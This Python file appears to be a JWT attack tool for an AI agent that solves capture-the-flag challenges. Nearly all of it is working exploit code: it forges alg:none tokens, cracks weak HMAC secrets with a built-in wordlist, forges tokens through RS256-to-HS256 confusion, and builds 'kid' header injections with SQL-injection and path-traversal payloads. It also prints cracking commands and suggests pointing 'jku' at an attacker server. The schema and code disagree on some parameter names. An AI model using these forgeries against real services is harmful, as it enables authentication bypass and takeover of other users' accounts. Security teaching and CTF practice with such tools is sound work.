"""
JWT attack tools for CTF solving.

Provides utilities for analyzing and manipulating JWT tokens in CTF challenges.
"""

import base64
import hashlib
import hmac
import json
from typing import Any, Dict, List, Optional, Tuple

from ctf_solver.tools.core import parse_json_input


class JwtTool:
    """
    JwtTool: analyze and manipulate JWT tokens for CTF challenges.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "token": "eyJ...",          # Required for most operations
          "operation": "decode",       # Required
          "claims": {"admin": true},   # For modify_claim
          "key": "secret123",          # For forge_with_key, crack
          "wordlist": ["secret", "password", ...]  # Optional for crack
        }

    Supported operations:
      - decode: Decode JWT without verification (shows header, payload, signature info)
      - forge_none: Create alg:none attack token (removes signature)
      - modify_claim: Modify claims in payload, resign if key provided
      - crack: Try common secrets to find signing key
      - forge_with_key: Create new JWT with given claims and key
      - analyze: Deep analysis of JWT for vulnerabilities
    """

    name: str = "jwt_tool"
    description: str = (
        "Analyze and manipulate JWT tokens for CTF challenges. Input must be JSON with "
        "'operation' (decode, forge_none, modify_claim, crack, forge_with_key, analyze, "
        "confusion_rs256_hs256, kid_inject) and 'token' (the JWT string). For modify_claim, "
        "provide 'claims' dict to update. For crack, optionally provide 'wordlist' array of "
        "secrets to try. For forge_with_key, provide 'claims' and 'key'. "
        "Use this tool to exploit JWT vulnerabilities like alg:none, weak secrets, etc."
    )
    parameters_schema = {
        "type": "object",
        "properties": {
            "operation": {
                "type": "string",
                "enum": [
                    "decode",
                    "forge_none",
                    "modify_claim",
                    "crack",
                    "forge_with_key",
                    "analyze",
                    "confusion_rs256_hs256",
                    "kid_inject",
                ],
            },
            "token": {"type": "string"},
            "claims": {
                "type": "object",
                "description": "Required for forge_none/modify_claim/forge_with_key/kid_inject",
            },
            "key": {
                "type": "string",
                "description": "HMAC secret for forge_with_key; public key (PEM) for confusion_rs256_hs256",
            },
            "wordlist": {
                "type": "array",
                "items": {"type": "string"},
                "description": "Secrets to try for crack",
            },
            "kid_payload": {
                "type": "string",
                "description": "Injection payload for kid_inject (e.g. SQLi/path-traversal)",
            },
        },
        "required": ["operation", "token"],
        "additionalProperties": False,
    }
    samples = [
        {"operation": "decode", "token": "eyJhbGciOiJIUzI1NiJ9.e30.x"},
        {
            "operation": "forge_none",
            "token": "eyJhbGciOiJIUzI1NiJ9.e30.x",
            "claims": {"role": "admin"},
        },
    ]

    # Common weak secrets used in CTF challenges
    COMMON_SECRETS = [
        "secret",
        "password",
        "123456",
        "admin",
        "key",
        "private",
        "secret123",
        "password123",
        "jwt",
        "jwt_secret",
        "supersecret",
        "changeme",
        "test",
        "dev",
        "development",
        "production",
        "qwerty",
        "letmein",
        "default",
        "none",
        "",
        "null",
        "undefined",
        "HS256",
        "HS384",
        "HS512",
        "RS256",
        "secret_key",
        "private_key",
        "my_secret",
        "mysecret",
        "your-256-bit-secret",
        "your-384-bit-secret",
        "your-512-bit-secret",
        "gsdT754!gs",
        "s3cr3t",
        "s3cret",
        "shhhhh",
        "verysecret",
        "supersecretkey",
        "secretkey",
        "flag",
        "ctf",
        "hack",
        "cookie_secret",
        "session_secret",
        "app_secret",
        "API_KEY",
        "api_key",
    ]

    OPERATIONS = {
        "decode",
        "forge_none",
        "modify_claim",
        "crack",
        "forge_with_key",
        "analyze",
        "confusion_rs256_hs256",
        "kid_inject",
    }

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        data, err = parse_json_input(tool_input, "JwtTool")
        if err:
            return err
        operation = data.get("operation", "").lower().strip()
        if not operation:
            return "[JwtTool] Error: 'operation' is required."

        if operation not in self.OPERATIONS:
            return (
                f"[JwtTool] Error: Unknown operation '{operation}'. "
                f"Valid operations: {', '.join(sorted(self.OPERATIONS))}"
            )

        token = data.get("token", "")
        claims = data.get("claims", {})
        key = data.get("key", "")
        wordlist = data.get("wordlist", [])

        try:
            if operation == "decode":
                return self._decode(token)
            elif operation == "forge_none":
                return self._forge_none(token)
            elif operation == "modify_claim":
                return self._modify_claim(token, claims, key)
            elif operation == "crack":
                return self._crack(token, wordlist)
            elif operation == "forge_with_key":
                return self._forge_with_key(claims, key, data.get("algorithm", "HS256"))
            elif operation == "analyze":
                return self._analyze(token)
            elif operation == "confusion_rs256_hs256":
                return self._confusion_rs256_hs256(token, key, claims)
            elif operation == "kid_inject":
                return self._kid_inject(token, claims, key, data.get("kid_value", ""))
            else:
                return f"[JwtTool] Error: Operation '{operation}' not implemented."
        except Exception as exc:
            return f"[JwtTool] Error performing '{operation}': {exc}"

    def _b64_url_encode(self, data: bytes) -> str:
        """URL-safe base64 encode without padding."""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    def _b64_url_decode(self, data: str) -> bytes:
        """URL-safe base64 decode with padding handling."""
        # Add padding if needed
        padded = data + "=" * (4 - len(data) % 4) if len(data) % 4 != 0 else data
        return base64.urlsafe_b64decode(padded)

    def _parse_jwt(
        self, token: str
    ) -> Tuple[Optional[Dict], Optional[Dict], Optional[str]]:
        """Parse JWT into header, payload, signature. Returns (header, payload, signature)."""
        if not token:
            return None, None, None

        parts = token.split(".")
        if len(parts) < 2:
            return None, None, None

        try:
            header = json.loads(self._b64_url_decode(parts[0]))
        except Exception:
            header = None

        try:
            payload = json.loads(self._b64_url_decode(parts[1]))
        except Exception:
            payload = None

        signature = parts[2] if len(parts) >= 3 else None

        return header, payload, signature

    def _decode(self, token: str) -> str:
        """Decode JWT without verification."""
        if not token:
            return "[JwtTool] Error: 'token' is required for decode operation."

        header, payload, signature = self._parse_jwt(token)

        if header is None and payload is None:
            return f"[JwtTool] Error: Invalid JWT format. Token: {token[:50]}..."

        result = "[JwtTool] JWT Decode\n"
        result += "=" * 50 + "\n\n"

        if header:
            result += "=== HEADER ===\n"
            result += json.dumps(header, indent=2) + "\n\n"

            alg = header.get("alg", "unknown")
            typ = header.get("typ", "unknown")
            result += f"Algorithm: {alg}\n"
            result += f"Type: {typ}\n"

            # Flag potential vulnerabilities
            if alg.lower() == "none":
                result += (
                    "[!] VULNERABLE: Algorithm is 'none' - no signature verification!\n"
                )
            elif alg.upper() in ["HS256", "HS384", "HS512"]:
                result += "[*] Uses symmetric HMAC signing - secret may be crackable\n"
            elif alg.upper() in ["RS256", "RS384", "RS512"]:
                result += (
                    "[*] Uses asymmetric RSA signing - check for algorithm confusion\n"
                )
            result += "\n"
        else:
            result += "=== HEADER ===\n[Could not decode header]\n\n"

        if payload:
            result += "=== PAYLOAD ===\n"
            result += json.dumps(payload, indent=2) + "\n\n"

            # Highlight interesting claims
            interesting_claims = []
            for key in [
                "admin",
                "role",
                "isAdmin",
                "is_admin",
                "user",
                "username",
                "sub",
                "iat",
                "exp",
                "nbf",
            ]:
                if key in payload:
                    interesting_claims.append(f"{key}: {payload[key]}")

            if interesting_claims:
                result += "Interesting claims:\n"
                for claim in interesting_claims:
                    result += f"  - {claim}\n"
                result += "\n"
        else:
            result += "=== PAYLOAD ===\n[Could not decode payload]\n\n"

        if signature is not None:
            result += "=== SIGNATURE ===\n"
            if signature == "" or signature == ".":
                result += "[EMPTY - possible alg:none attack!]\n"
            else:
                result += f"[Present, {len(signature)} chars]\n"
                result += (
                    f"Raw: {signature[:50]}{'...' if len(signature) > 50 else ''}\n"
                )

        return result

    def _forge_none(self, token: str) -> str:
        """Create alg:none attack token."""
        if not token:
            return "[JwtTool] Error: 'token' is required for forge_none operation."

        header, payload, _ = self._parse_jwt(token)

        if payload is None:
            return "[JwtTool] Error: Could not parse JWT payload."

        if header is None:
            header = {}

        # Create multiple variants of alg:none attack
        results = []
        none_variants = ["none", "None", "NONE", "nOnE"]

        for variant in none_variants:
            new_header = dict(header)
            new_header["alg"] = variant

            header_b64 = self._b64_url_encode(
                json.dumps(new_header, separators=(",", ":")).encode()
            )
            payload_b64 = self._b64_url_encode(
                json.dumps(payload, separators=(",", ":")).encode()
            )

            # Variants: with empty sig, with dot but no sig, without trailing dot
            forged_tokens = [
                f"{header_b64}.{payload_b64}.",  # Standard with trailing dot
                f"{header_b64}.{payload_b64}",  # No trailing dot
                f"{header_b64}.{payload_b64}..",  # Double dot
            ]

            results.append((variant, forged_tokens[0]))  # Just use standard one

        result = "[JwtTool] alg:none Attack Tokens\n"
        result += "=" * 50 + "\n\n"
        result += "Original payload preserved. Try these tokens:\n\n"

        for alg_variant, forged in results:
            result += f"--- alg: '{alg_variant}' ---\n"
            result += f"{forged}\n\n"

        result += "TIP: Some servers only accept specific casing of 'none'.\n"
        result += "TIP: Try with and without trailing dot after the second period.\n"

        # Also provide just the first one for easy copy
        result += f"\n[Recommended token to try first]:\n{results[0][1]}\n"

        return result

    def _modify_claim(self, token: str, claims: Dict[str, Any], key: str = "") -> str:
        """Modify claims in JWT payload."""
        if not token:
            return "[JwtTool] Error: 'token' is required for modify_claim operation."

        if not claims:
            return (
                "[JwtTool] Error: 'claims' dict is required for modify_claim operation."
            )

        header, payload, _ = self._parse_jwt(token)

        if payload is None:
            return "[JwtTool] Error: Could not parse JWT payload."

        if header is None:
            header = {"alg": "HS256", "typ": "JWT"}

        # Update payload with new claims
        original_payload = dict(payload)
        payload.update(claims)

        result = "[JwtTool] Modified JWT\n"
        result += "=" * 50 + "\n\n"
        result += "Changes made:\n"
        for k, v in claims.items():
            old_val = original_payload.get(k, "<not present>")
            result += f"  {k}: {old_val} -> {v}\n"
        result += "\n"

        header_b64 = self._b64_url_encode(
            json.dumps(header, separators=(",", ":")).encode()
        )
        payload_b64 = self._b64_url_encode(
            json.dumps(payload, separators=(",", ":")).encode()
        )

        if key:
            # Sign with provided key
            alg = header.get("alg", "HS256").upper()
            try:
                signature = self._sign(header_b64, payload_b64, key, alg)
                forged = f"{header_b64}.{payload_b64}.{signature}"
                result += f"[Signed with key using {alg}]\n"
                result += f"Token: {forged}\n"
            except Exception as e:
                result += f"[Signing failed: {e}]\n"
                result += "Falling back to unsigned tokens:\n\n"
                key = ""

        if not key:
            # Provide multiple attack variants
            result += "[No key provided - generating attack variants]\n\n"

            # alg:none variant
            none_header = dict(header)
            none_header["alg"] = "none"
            none_header_b64 = self._b64_url_encode(
                json.dumps(none_header, separators=(",", ":")).encode()
            )
            result += f"--- alg:none variant ---\n{none_header_b64}.{payload_b64}.\n\n"

            # Original alg but no signature (sometimes works)
            result += (
                f"--- Original alg, no signature ---\n{header_b64}.{payload_b64}.\n\n"
            )

            result += (
                "TIP: If you know the secret key, provide it with 'key' parameter.\n"
            )

        return result

    def _sign(self, header_b64: str, payload_b64: str, key: str, alg: str) -> str:
        """Sign JWT with HMAC."""
        signing_input = f"{header_b64}.{payload_b64}"

        if alg == "HS256":
            sig = hmac.new(
                key.encode(), signing_input.encode(), hashlib.sha256
            ).digest()
        elif alg == "HS384":
            sig = hmac.new(
                key.encode(), signing_input.encode(), hashlib.sha384
            ).digest()
        elif alg == "HS512":
            sig = hmac.new(
                key.encode(), signing_input.encode(), hashlib.sha512
            ).digest()
        else:
            raise ValueError(f"Unsupported algorithm for signing: {alg}")

        return self._b64_url_encode(sig)

    def _crack(self, token: str, wordlist: List[str]) -> str:
        """Try to crack JWT secret using wordlist."""
        if not token:
            return "[JwtTool] Error: 'token' is required for crack operation."

        header, payload, signature = self._parse_jwt(token)

        if header is None or signature is None:
            return "[JwtTool] Error: Could not parse JWT or no signature present."

        alg = header.get("alg", "").upper()
        if alg not in ["HS256", "HS384", "HS512"]:
            return (
                f"[JwtTool] Error: Cannot crack algorithm '{alg}'. "
                f"Only HS256, HS384, HS512 can be cracked with this method."
            )

        # Use provided wordlist or default
        secrets_to_try = wordlist if wordlist else self.COMMON_SECRETS

        parts = token.split(".")
        header_b64 = parts[0]
        payload_b64 = parts[1]
        original_sig = parts[2]

        result = "[JwtTool] JWT Secret Cracking\n"
        result += "=" * 50 + "\n\n"
        result += f"Algorithm: {alg}\n"
        result += f"Trying {len(secrets_to_try)} secrets...\n\n"

        found_secrets = []
        for secret in secrets_to_try:
            try:
                test_sig = self._sign(header_b64, payload_b64, secret, alg)
                if test_sig == original_sig:
                    found_secrets.append(secret)
            except Exception:
                continue

        if found_secrets:
            result += "[!] SECRET FOUND!\n\n"
            for secret in found_secrets:
                display_secret = secret if secret else "(empty string)"
                result += f"Secret: {display_secret}\n"

            # Generate a sample forged token
            secret = found_secrets[0]
            sample_payload = dict(payload)
            if "admin" in sample_payload:
                sample_payload["admin"] = True
            elif "role" in sample_payload:
                sample_payload["role"] = "admin"
            else:
                sample_payload["admin"] = True

            new_payload_b64 = self._b64_url_encode(
                json.dumps(sample_payload, separators=(",", ":")).encode()
            )
            new_sig = self._sign(header_b64, new_payload_b64, secret, alg)
            forged = f"{header_b64}.{new_payload_b64}.{new_sig}"

            result += f"\n[Sample forged token with admin claim]:\n{forged}\n"
        else:
            result += "[*] No secret found in wordlist.\n"
            result += (
                "TIP: Try a larger wordlist or use hashcat/john for offline cracking:\n"
            )
            result += f"  hashcat -m 16500 '{token}' wordlist.txt\n"
            result += "  john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt\n"

        return result

    def _forge_with_key(
        self, claims: Dict[str, Any], key: str, algorithm: str = "HS256"
    ) -> str:
        """Create a new JWT with given claims and key."""
        if not claims:
            return "[JwtTool] Error: 'claims' dict is required for forge_with_key operation."

        if not key:
            return "[JwtTool] Error: 'key' is required for forge_with_key operation."

        algorithm = algorithm.upper()
        if algorithm not in ["HS256", "HS384", "HS512"]:
            return f"[JwtTool] Error: Unsupported algorithm '{algorithm}'. Use HS256, HS384, or HS512."

        header = {"alg": algorithm, "typ": "JWT"}

        header_b64 = self._b64_url_encode(
            json.dumps(header, separators=(",", ":")).encode()
        )
        payload_b64 = self._b64_url_encode(
            json.dumps(claims, separators=(",", ":")).encode()
        )

        try:
            signature = self._sign(header_b64, payload_b64, key, algorithm)
        except Exception as e:
            return f"[JwtTool] Error signing token: {e}"

        token = f"{header_b64}.{payload_b64}.{signature}"

        result = "[JwtTool] Forged JWT\n"
        result += "=" * 50 + "\n\n"
        result += f"Algorithm: {algorithm}\n"
        result += f"Claims: {json.dumps(claims, indent=2)}\n\n"
        result += f"Token:\n{token}\n"

        return result

    def _analyze(self, token: str) -> str:
        """Deep analysis of JWT for vulnerabilities."""
        if not token:
            return "[JwtTool] Error: 'token' is required for analyze operation."

        header, payload, signature = self._parse_jwt(token)

        result = "[JwtTool] JWT Security Analysis\n"
        result += "=" * 50 + "\n\n"

        vulnerabilities = []
        info = []

        # Check if parseable
        if header is None:
            result += "[!] Could not parse JWT header\n"
            return result

        if payload is None:
            result += "[!] Could not parse JWT payload\n"
            return result

        # Algorithm analysis
        alg = header.get("alg", "")
        result += f"Algorithm: {alg}\n\n"

        if alg.lower() == "none":
            vulnerabilities.append(
                "CRITICAL: Algorithm is 'none' - token accepts any payload!"
            )
        elif alg.upper() in ["HS256", "HS384", "HS512"]:
            info.append(f"Uses HMAC ({alg}) - may be vulnerable to weak secret attacks")
            info.append("Try 'crack' operation to bruteforce the secret")
        elif alg.upper() in ["RS256", "RS384", "RS512"]:
            info.append(f"Uses RSA ({alg}) - check for algorithm confusion attack")
            info.append("Try changing to HS256 and signing with public key")

        # Check for missing or empty signature
        if signature is None or signature == "" or signature == ".":
            vulnerabilities.append(
                "Signature is empty/missing - possible alg:none vulnerability"
            )

        # Payload analysis
        result += "=== Payload Analysis ===\n"

        # Check for privilege-related claims
        priv_claims = [
            "admin",
            "role",
            "isAdmin",
            "is_admin",
            "superuser",
            "root",
            "privilege",
            "level",
        ]
        found_priv = {k: payload.get(k) for k in priv_claims if k in payload}
        if found_priv:
            result += f"Privilege claims found: {json.dumps(found_priv)}\n"
            info.append("Try modifying privilege claims (e.g., admin: true)")

        # Check for user identifiers
        user_claims = ["sub", "user", "username", "uid", "user_id", "email"]
        found_user = {k: payload.get(k) for k in user_claims if k in payload}
        if found_user:
            result += f"User identifier claims: {json.dumps(found_user)}\n"
            info.append("Try changing user identifier to access other accounts")

        # Check timestamps
        import time

        now = int(time.time())

        if "exp" in payload:
            exp = payload["exp"]
            if isinstance(exp, (int, float)):
                if exp < now:
                    info.append(f"Token is EXPIRED (exp: {exp}, now: {now})")
                else:
                    info.append(f"Token expires in {exp - now} seconds")

        if "iat" in payload:
            iat = payload["iat"]
            if isinstance(iat, (int, float)):
                info.append(f"Token issued {now - iat} seconds ago")

        if "nbf" in payload:
            nbf = payload["nbf"]
            if isinstance(nbf, (int, float)):
                if nbf > now:
                    info.append(f"Token not valid yet (nbf: {nbf})")

        # Check for kid (key ID) header - possible injection
        if "kid" in header:
            kid = header["kid"]
            vulnerabilities.append(f"'kid' header present: {kid}")
            info.append("kid may be vulnerable to SQL injection or path traversal")
            info.append(
                'Try: kid: "../../../dev/null" or kid: "\' UNION SELECT \'secret\'--"'
            )

        # Check for jku (JWK Set URL) - possible SSRF
        if "jku" in header:
            vulnerabilities.append(f"'jku' header present: {header['jku']}")
            info.append(
                "jku may allow SSRF - try pointing to your server with custom JWKS"
            )

        # Output
        result += "\n=== Vulnerabilities ===\n"
        if vulnerabilities:
            for v in vulnerabilities:
                result += f"[!] {v}\n"
        else:
            result += "No obvious vulnerabilities detected.\n"

        result += "\n=== Attack Suggestions ===\n"
        if info:
            for i in info:
                result += f"[*] {i}\n"
        else:
            result += "No specific suggestions.\n"

        result += "\n=== Recommended Next Steps ===\n"
        if alg.upper() in ["HS256", "HS384", "HS512"]:
            result += "1. Try 'crack' operation to find weak secret\n"
        if alg.upper() in ["RS256", "RS384", "RS512"]:
            result += "1. Try 'confusion_rs256_hs256' to exploit algorithm confusion\n"
        if "kid" in header:
            result += "2. Try 'kid_inject' to exploit kid header injection\n"
        result += "3. Try 'forge_none' operation to bypass signature\n"
        result += "4. Try 'modify_claim' to change privilege claims\n"

        return result

    def _confusion_rs256_hs256(
        self, token: str, public_key: str, claims: Dict[str, Any]
    ) -> str:
        """
        RS256 -> HS256 algorithm confusion attack.

        If the server uses RS256 (asymmetric), it verifies with the public key.
        By switching to HS256 (symmetric), the server may use the public key as
        the HMAC secret, allowing us to forge tokens with the known public key.

        Args:
            token: The original JWT (to extract payload if no claims provided)
            public_key: The server's public key (PEM format)
            claims: Optional claims to set in the forged token
        """
        result = "[JwtTool] RS256→HS256 Algorithm Confusion Attack\n"
        result += "=" * 50 + "\n\n"

        if not token and not claims:
            return "[JwtTool] Error: 'token' or 'claims' required for confusion attack."

        if not public_key:
            result += "[!] No public key provided. To use this attack:\n"
            result += "  1. Find the server's public key (often at /.well-known/jwks.json, /api/public-key, etc.)\n"
            result += "  2. Provide it as the 'key' parameter in PEM format\n"
            result += "  3. Re-run with 'key' set to the public key content\n\n"
            result += "=== Common public key locations ===\n"
            result += "  - /.well-known/jwks.json\n"
            result += "  - /api/v1/public-key\n"
            result += "  - /oauth/jwks\n"
            result += "  - /api/auth/public-key\n"
            result += "  - Check page source or JavaScript for embedded keys\n"
            return result

        # Get payload from token or use provided claims
        if token:
            _, payload, _ = self._parse_jwt(token)
            if payload is None:
                payload = {}
        else:
            payload = {}

        if claims:
            payload.update(claims)

        # Create HS256 header (the attack: switch from RS256 to HS256)
        header = {"alg": "HS256", "typ": "JWT"}

        header_b64 = self._b64_url_encode(
            json.dumps(header, separators=(",", ":")).encode()
        )
        payload_b64 = self._b64_url_encode(
            json.dumps(payload, separators=(",", ":")).encode()
        )

        # Sign with the public key as HMAC secret
        try:
            signature = self._sign(header_b64, payload_b64, public_key, "HS256")
            forged = f"{header_b64}.{payload_b64}.{signature}"

            result += "[*] Attack: Changed algorithm from RS256 to HS256\n"
            result += "[*] Signed with the public key as HMAC secret\n\n"
            result += f"Payload: {json.dumps(payload, indent=2)}\n\n"
            result += f"Forged token:\n{forged}\n\n"
            result += "=== How it works ===\n"
            result += "1. Server expects RS256 (asymmetric): verify with PUBLIC key\n"
            result += "2. We changed alg to HS256 (symmetric): verify with SECRET key\n"
            result += (
                "3. If server uses same key for both, it will use the PUBLIC key\n"
            )
            result += "   as the HMAC secret — which we know!\n"
        except Exception as e:
            result += f"[!] Error creating forged token: {e}\n"
            result += "Make sure 'key' contains the PEM public key content.\n"

        return result

    def _kid_inject(
        self, token: str, claims: Dict[str, Any], key: str, kid_value: str
    ) -> str:
        """
        Exploit 'kid' (Key ID) header injection.

        The kid header can be vulnerable to:
        - SQL injection: kid becomes part of a SQL query
        - Path traversal: kid is used to load a key file
        - Command injection: kid is used in a shell command
        """
        result = "[JwtTool] kid Header Injection Attack\n"
        result += "=" * 50 + "\n\n"

        if not token and not claims:
            return "[JwtTool] Error: 'token' or 'claims' required for kid_inject."

        # Get payload from token or use provided claims
        if token:
            header, payload, _ = self._parse_jwt(token)
            if header is None:
                header = {"alg": "HS256", "typ": "JWT"}
            if payload is None:
                payload = {}
        else:
            header = {"alg": "HS256", "typ": "JWT"}
            payload = {}

        if claims:
            payload.update(claims)

        # Generate attack variants
        attacks = []

        # Path traversal attacks (key loaded from file)
        path_traversal_kids = [
            ("../../../dev/null", "", "Sign with empty key (dev/null)"),
            ("../../../proc/sys/kernel/hostname", "", "Sign with hostname as key"),
            ("../../../../../../dev/null", "", "Deep traversal to dev/null"),
        ]
        for kid, sign_key, desc in path_traversal_kids:
            attacks.append(("path_traversal", kid, sign_key, desc))

        # SQL injection attacks (kid used in SQL query)
        sqli_kids = [
            ("' UNION SELECT 'secret' --", "secret", "SQLi: force key = 'secret'"),
            ("' UNION SELECT '' --", "", "SQLi: force empty key"),
            ("' OR '1'='1", key or "secret", "SQLi: bypass key lookup"),
        ]
        for kid, sign_key, desc in sqli_kids:
            attacks.append(("sqli", kid, sign_key, desc))

        # Custom kid value if provided
        if kid_value:
            attacks.insert(
                0, ("custom", kid_value, key or "", f"Custom kid: {kid_value}")
            )

        result += f"Original payload: {json.dumps(payload, indent=2)}\n\n"
        result += "=== Generated Attack Tokens ===\n\n"

        for attack_type, kid, sign_key, desc in attacks:
            attack_header = dict(header)
            attack_header["kid"] = kid
            attack_header["alg"] = "HS256"

            header_b64 = self._b64_url_encode(
                json.dumps(attack_header, separators=(",", ":")).encode()
            )
            payload_b64 = self._b64_url_encode(
                json.dumps(payload, separators=(",", ":")).encode()
            )

            try:
                signature = self._sign(header_b64, payload_b64, sign_key, "HS256")
                forged = f"{header_b64}.{payload_b64}.{signature}"

                result += f"--- {attack_type}: {desc} ---\n"
                result += f"kid: {kid}\n"
                result += f"signing key: {sign_key!r}\n"
                result += f"Token: {forged}\n\n"
            except Exception as e:
                result += f"--- {attack_type}: {desc} ---\n"
                result += f"[Error: {e}]\n\n"

        result += "=== Tips ===\n"
        result += "1. Path traversal: Works when server loads key from file using kid\n"
        result += "2. SQL injection: Works when kid is used in a SQL query\n"
        result += "3. /dev/null is empty → sign with empty string as key\n"
        result += "4. Try both HS256 and original algorithm\n"

        return result
